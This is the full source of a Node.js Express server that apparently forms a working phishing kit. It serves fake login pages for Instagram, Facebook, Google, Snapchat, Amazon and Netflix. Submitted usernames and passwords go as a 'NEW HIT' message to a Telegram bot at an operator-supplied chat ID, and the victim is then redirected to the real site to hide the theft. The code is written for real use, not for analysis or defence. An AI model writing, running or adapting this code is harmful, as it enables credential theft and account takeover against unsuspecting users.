const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
const BOT_TOKEN = process.env.BOT_TOKEN; // Sirf Bot Token ki zaroorat hai

const redirectMap = {
    'Instagram': 'https://www.instagram.com', 'Facebook': 'https://www.facebook.com',
    'Google': 'https://www.google.com', 'Snapchat': 'https://www.snapchat.com',
    'Amazon': 'https://www.amazon.com', 'Netflix': 'https://www.netflix.com'
};

app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    const service = req.query.service;
    if (service && redirectMap[service]) {
        res.sendFile(path.join(__dirname, 'pages', service.toLowerCase() + '.html'));
    } else {
        res.status(404).send('Service Not Found.');
    }
});

app.post('/login-data', (req, res) => {
    // NAYA UPGRADE: Form se recipientId (user ki ID) nikalo
    const { username, password, service, recipientId } = req.body;

    if (!username || !password || !service || !recipientId) {
        return res.status(400).send("Invalid request. User ID is missing.");
    }
    
    if (!BOT_TOKEN) {
        return res.status(500).send("Server configuration error: BOT_TOKEN is missing.");
    }

    const message = `💎✨ **!! NEW HIT !!** ✨💎\n▬▬▬▬▬▬▬▬▬▬▬▬\n🎯 **Service:** *${service}*\n👤 **Username:** \`${username}\`\n🔑 **Password:** \`${password}\`\n▬▬▬▬▬▬▬▬▬▬▬▬`;
    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // NAYA UPGRADE: Data ko hardcoded CHAT_ID ki jagah, dynamic recipientId par bhejo
    axios.post(telegramApiUrl, {
        chat_id: recipientId, // Yahan badlaav hua hai
        text: message,
        parse_mode: 'Markdown'
    })
    .then(() => res.redirect(redirectMap[service]))
    .catch(error => {
        console.error("Telegram API Error:", error.response.data);
        res.status(500).send("Error sending data.");
    });
});

module.exports = app;
